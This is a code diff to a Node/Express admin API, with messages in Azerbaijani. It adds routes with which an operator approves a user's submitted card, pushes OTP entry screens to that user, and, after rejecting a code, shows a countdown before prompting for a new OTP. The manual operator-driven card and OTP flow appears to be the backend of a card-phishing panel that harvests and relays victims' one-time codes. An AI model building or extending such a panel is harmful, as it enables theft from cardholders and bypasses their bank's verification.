@@ -262,6 +262,24 @@ pages.get('/sinxronizasiya', requireAdmin, async (req, res, next) => {
 // ==================== API ROUTES ====================
 api.use(requireAdmin);
 
+api.post('/payments/:id/approve-card', async (req, res) => {
+  try {
+    await paymentService.adminApproveCard(req.params.id, req.currentUser.email);
+    return res.json({ ok: true, message: '✅ Təsdiqləndi — istifadəçidə OTP ekranı açıldı.' });
+  } catch (e) {
+    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
+  }
+});
+
+api.post('/payments/:id/open-otp', async (req, res) => {
+  try {
+    await paymentService.adminOpenOtp(req.params.id, req.currentUser.email);
+    return res.json({ ok: true, message: '🔄 Yeni OTP ekranı istifadəçidə açıldı.' });
+  } catch (e) {
+    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
+  }
+});
+
 api.post('/payments/:id/approve-final', async (req, res) => {
   try {
     const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
@@ -280,8 +298,8 @@ api.post('/payments/:id/reject-otp', async (req, res) => {
     const result = await paymentService.adminRejectOtp(req.params.id, req.currentUser.email);
     return res.json({
       ok: true,
-      message: '❌ Səhv OTP - Yeni kod yaradıldı. İstifadəçi yenidən cəhd edəcək.',
-      code: result.code
+      message: '❌ Səhv OTP — istifadəçidə 2 dəq geri sayım başladı, sonra yeni OTP ekranı açılacaq.',
+      code: result.code || ''
     });
   } catch (e) {
     return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
